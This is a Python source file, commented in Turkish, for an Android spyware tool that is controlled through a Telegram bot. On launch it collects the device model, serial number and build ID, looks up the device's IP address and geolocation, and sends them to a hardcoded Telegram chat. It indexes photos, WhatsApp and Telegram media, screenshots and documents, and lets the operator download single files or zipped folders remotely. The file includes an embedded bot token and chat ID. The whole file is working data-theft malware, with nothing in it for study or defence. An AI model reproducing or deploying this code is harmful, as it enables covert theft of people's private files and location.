import os
import json
import time
import requests
import zipfile
import asyncio
import platform
from telegram.ext import Application, CommandHandler

# Telegram Bot Ayarları
BOT_TOKEN = "7990420796:AAEqVI1L0WiGL8l66L_njVYvgnaC2vNbL6Y"
CHAT_ID = "6736473228"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
TELEGRAM_MESSAGE_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

# Dosya-nesne eşleştirmesi
dosya_haritasi = {}

def cihaz_bilgisi_al():
    bilgiler = {}
    try:
        # getprop komutları (Android’e özgü)
        try:
            model = os.popen("getprop ro.product.model").read().strip()
            bilgiler["Model"] = model if model else "Bilinmiyor (getprop ro.product.model başarısız)"
        except Exception as e:
            bilgiler["Model"] = f"Bilinmiyor (Hata: {str(e)})"
            # Alternatif: platform modülü
            try:
                bilgiler["Model"] = platform.node() or "Bilinmiyor (platform.node başarısız)"
            except:
                pass
        
        try:
            os_versiyon = os.popen("getprop ro.build.version.release").read().strip()
            bilgiler["OS"] = os_versiyon if os_versiyon else "Bilinmiyor (getprop ro.build.version.release başarısız)"
        except Exception as e:
            bilgiler["OS"] = f"Bilinmiyor (Hata: {str(e)})"
            # Alternatif: platform modülü
            try:
                bilgiler["OS"] = platform.system() + " " + platform.release() or "Bilinmiyor (platform başarısız)"
            except:
                pass
        
        try:
            seri_no = os.popen("getprop ro.serialno").read().strip()
            bilgiler["Seri No"] = seri_no if seri_no else "Bilinmiyor (getprop ro.serialno başarısız)"
        except Exception as e:
            bilgiler["Seri No"] = f"Bilinmiyor (Hata: {str(e)})"
        
        try:
            cihaz_id = os.popen("getprop ro.build.id").read().strip()
            bilgiler["Cihaz ID"] = cihaz_id if cihaz_id else "Bilinmiyor (getprop ro.build.id başarısız)"
        except Exception as e:
            bilgiler["Cihaz ID"] = f"Bilinmiyor (Hata: {str(e)})"
        
        try:
            uretici = os.popen("getprop ro.product.manufacturer").read().strip()
            bilgiler["Üretici"] = uretici if uretici else "Bilinmiyor (getprop ro.product.manufacturer başarısız)"
        except Exception as e:
            bilgiler["Üretici"] = f"Bilinmiyor (Hata: {str(e)})"
        
        try:
            ip_response = requests.get("https://api.ipify.org/?format=json", timeout=5)
            ip_json = ip_response.json()
            ip = ip_json.get("ip", "Bilinmiyor")
            bilgiler["IP"] = ip
            ip_info_response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
            ip_info = ip_info_response.json()
            bilgiler["Ülke"] = ip_info.get("country", "Bilinmiyor")
            bilgiler["Ülke Kodu"] = ip_info.get("countryCode", "Bilinmiyor")
            bilgiler["Bölge"] = ip_info.get("region", "Bilinmiyor")
            bilgiler["Bölge Adı"] = ip_info.get("regionName", "Bilinmiyor")
            bilgiler["Şehir"] = ip_info.get("city", "Bilinmiyor")
            bilgiler["Posta Kodu"] = ip_info.get("zip", "Bilinmiyor")
            bilgiler["Enlem"] = str(ip_info.get("lat", "Bilinmiyor"))
            bilgiler["Boylam"] = str(ip_info.get("lon", "Bilinmiyor"))
            bilgiler["ISP"] = ip_info.get("isp", "Bilinmiyor")
            bilgiler["Organizasyon"] = ip_info.get("org", "Bilinmiyor")
        except Exception as e:
            bilgiler["IP"] = f"Bilinmiyor (Hata: {str(e)})"
            bilgiler["Ülke"] = "Bilinmiyor"
            bilgiler["Ülke Kodu"] = "Bilinmiyor"
            bilgiler["Bölge"] = "Bilinmiyor"
            bilgiler["Bölge Adı"] = "Bilinmiyor"
            bilgiler["Şehir"] = "Bilinmiyor"
            bilgiler["Posta Kodu"] = "Bilinmiyor"
            bilgiler["Enlem"] = "Bilinmiyor"
            bilgiler["Boylam"] = "Bilinmiyor"
            bilgiler["ISP"] = "Bilinmiyor"
            bilgiler["Organizasyon"] = "Bilinmiyor"
    except Exception as e:
        bilgiler["Hata"] = f"Bilgiler alınamadı: {str(e)}"
    return bilgiler

def dosya_tara():
    klasorler = {
        "Download": "/sdcard/Download",
        "Pictures": "/sdcard/Pictures",
        "Movies": "/sdcard/Movies",
        "Documents": "/sdcard/Documents",
        "WhatsApp Media": "/sdcard/WhatsApp/Media",
        "DCIM": "/sdcard/DCIM",
        "Music": "/sdcard/Music",
        "Telegram": "/sdcard/Telegram",
        "Screenshots": "/sdcard/Pictures/Screenshots",
        "Recordings": "/sdcard/Recordings",
        "Bluetooth": "/sdcard/Bluetooth"
    }
    dosya_listesi = {}
    global dosya_haritasi
    dosya_haritasi = {}
    sayac = 1
    medya_uzantilari = [".jpg", ".png"]  # Boyut sınırı olmayanlar
    diger_uzantilari = [".pdf", ".docx", ".txt", ".zip", ".mp4"]  # 1MB+ olanlar
    min_boyut = 1024 * 1024  # 1MB sınır
    
    for klasor, yol in klasorler.items():
        dosya_listesi[klasor] = []
        try:
            for root, _, files in os.walk(yol):
                for dosya in files:
                    tam_yol = os.path.join(root, dosya)
                    try:
                        dosya_boyutu = os.path.getsize(tam_yol)
                        if any(dosya.lower().endswith(uzanti) for uzanti in medya_uzantilari):
                            dosya_listesi[klasor].append({f"[{sayac}]": dosya})
                            dosya_haritasi[str(sayac)] = tam_yol
                            sayac += 1
                        elif any(dosya.lower().endswith(uzanti) for uzanti in diger_uzantilari) and dosya_boyutu >= min_boyut:
                            dosya_listesi[klasor].append({f"[{sayac}]": dosya})
                            dosya_haritasi[str(sayac)] = tam_yol
                            sayac += 1
                    except:
                        continue
        except Exception as e:
            dosya_listesi[klasor].append({"Hata": f"{klasor} taranamadı: {str(e)}"})
    return dosya_listesi, klasorler

def arsiv_olustur(kategori, klasor_yolu):
    zaman_damgasi = int(time.time())
    arsiv_yolu = f"/sdcard/tmp/dosyalar_{kategori}_{zaman_damgasi}.zip"
    medya_uzantilari = [".jpg", ".png"]
    diger_uzantilari = [".pdf", ".docx", ".txt", ".zip", ".mp4"]
    min_boyut = 1024 * 1024  # 1MB
    
    try:
        os.makedirs("/sdcard/tmp", exist_ok=True)
        with zipfile.ZipFile(arsiv_yolu, 'w', zipfile.ZIP_DEFLATED) as zip_dosyasi:
            for root, _, files in os.walk(klasor_yolu):
                for dosya in files:
                    tam_yol = os.path.join(root, dosya)
                    try:
                        dosya_boyutu = os.path.getsize(tam_yol)
                        if any(dosya.lower().endswith(uzanti) for uzanti in medya_uzantilari):
                            zip_dosyasi.write(tam_yol, os.path.relpath(tam_yol, klasor_yolu))
                        elif any(dosya.lower().endswith(uzanti) for uzanti in diger_uzantilari) and dosya_boyutu >= min_boyut:
                            zip_dosyasi.write(tam_yol, os.path.relpath(tam_yol, klasor_yolu))
                    except:
                        continue
        return arsiv_yolu
    except Exception as e:
        return None, f"Arşiv oluşturulamadı: {str(e)}"

async def bilgileri_kaydet_ve_gonder(context):
    zaman_damgasi = int(time.time())
    cihaz_bilgisi = cihaz_bilgisi_al()
    cihaz_mesaji = (
        "╔══════════════════════╗\n"
        "║      Cihaz Bilgisi   ║\n"
        "╠══════════════════════╣\n"
        f"║ Model: {cihaz_bilgisi.get('Model', 'Bilinmiyor')} \n"
        f"║ OS: {cihaz_bilgisi.get('OS', 'Bilinmiyor')} \n"
        f"║ Seri No: {cihaz_bilgisi.get('Seri No', 'Bilinmiyor')} \n"
        f"║ Cihaz ID: {cihaz_bilgisi.get('Cihaz ID', 'Bilinmiyor')} \n"
        f"║ Üretici: {cihaz_bilgisi.get('Üretici', 'Bilinmiyor')} \n"
        "╠══════════════════════╣\n"
        "║      IP Bilgisi      ║\n"
        "╠══════════════════════╣\n"
        f"║ IP: {cihaz_bilgisi.get('IP', 'Bilinmiyor')} \n"
        f"║ Ülke: {cihaz_bilgisi.get('Ülke', 'Bilinmiyor')} \n"
        f"║ Ülke Kodu: {cihaz_bilgisi.get('Ülke Kodu', 'Bilinmiyor')} \n"
        f"║ Bölge: {cihaz_bilgisi.get('Bölge', 'Bilinmiyor')} \n"
        f"║ Bölge Adı: {cihaz_bilgisi.get('Bölge Adı', 'Bilinmiyor')} \n"
        f"║ Şehir: {cihaz_bilgisi.get('Şehir', 'Bilinmiyor')} \n"
        f"║ Posta Kodu: {cihaz_bilgisi.get('Posta Kodu', 'Bilinmiyor')} \n"
        f"║ Enlem: {cihaz_bilgisi.get('Enlem', 'Bilinmiyor')} \n"
        f"║ Boylam: {cihaz_bilgisi.get('Boylam', 'Bilinmiyor')} \n"
        f"║ ISP: {cihaz_bilgisi.get('ISP', 'Bilinmiyor')} \n"
        f"║ Organizasyon: {cihaz_bilgisi.get('Organizasyon', 'Bilinmiyor')} \n"
        "╚══════════════════════╝"
    )
    await context.bot.send_message(chat_id=CHAT_ID, text=cihaz_mesaji)
    print("Cihaz ve IP bilgisi mesaj olarak gönderildi!")
    dosya_listesi, _ = dosya_tara()
    dosya_dosyasi = f"dosyalar_{zaman_damgasi}.json"
    with open(dosya_dosyasi, "w") as f:
        json.dump(dosya_listesi, f, indent=4, ensure_ascii=False)
    print(f"Dosyalar {dosya_dosyasi} kaydedildi!")
    with open(dosya_dosyasi, "rb") as f:
        await context.bot.send_document(chat_id=CHAT_ID, document=f)
    print(f"{dosya_dosyasi} Telegram'a gönderildi!")

async def select_file(update, context):
    try:
        numara = context.args[0]
        dosya_yolu = dosya_haritasi.get(numara)
        if not dosya_yolu or not os.path.exists(dosya_yolu):
            await update.message.reply_text(f"Numara {numara} bulunamadı, kral! 😈")
            return
        with open(dosya_yolu, "rb") as f:
            await update.message.reply_document(document=f, filename=os.path.basename(dosya_yolu))
        print(f"{numara} numaralı dosya ({dosya_yolu}) Telegram'a gönderildi!")
    except:
        await update.message.reply_text("Hata, dosya gönderilemedi!")

async def category(update, context):
    _, klasorler = dosya_tara()  # Klasör listesini al
    kategori_listesi = "\n".join([f"{i+1}. {k}" for i, k in enumerate(klasorler.keys())])
    mesaj = (
        "Kategori seç kral! 😈\n"
        f"{kategori_listesi}\n"
        "Örnek: /category Download"
    )
    if not context.args:
        await update.message.reply_text(mesaj)
        return
    
    kategori = " ".join(context.args).strip()
    if kategori not in klasorler:
        await update.message.reply_text(f"Geçersiz kategori: {kategori}, kral! 😈 Listeden seç:\n{mesaj}")
        return
    
    klasor_yolu = klasorler[kategori]
    arsiv_yolu = arsiv_olustur(kategori, klasor_yolu)
    if not arsiv_yolu:
        await update.message.reply_text(f"Arşiv oluşturulamadı, kral! 😈 Hata: {arsiv_yolu[1]}")
        return
    
    try:
        with open(arsiv_yolu, "rb") as f:
            await update.message.reply_document(document=f, filename=os.path.basename(arsiv_yolu))
        print(f"{kategori} kategorisi arşivi ({arsiv_yolu}) Telegram'a gönderildi!")
        os.remove(arsiv_yolu)  # Arşivi gönderildikten sonra sil
        print(f"{arsiv_yolu} silindi!")
    except Exception as e:
        await update.message.reply_text(f"Hata, arşiv gönderilemedi: {str(e)}")

async def main():
    print("Botu başlatıyorum, kral! 😈")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("select", select_file))
    app.add_handler(CommandHandler("category", category))
    # Uygulamayı başlat
    await app.initialize()
    # bilgileri_kaydet_ve_gonder'i job_queue ile çalıştır
    if app.job_queue is None:
        print("JobQueue başlatılamadı, lütfen 'python-telegram-bot[job-queue]' kurun!")
        return
    app.job_queue.run_once(bilgileri_kaydet_ve_gonder, when=0)
    # Botu çalıştır
    await app.run_polling()
    # Kapat
    await app.shutdown()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
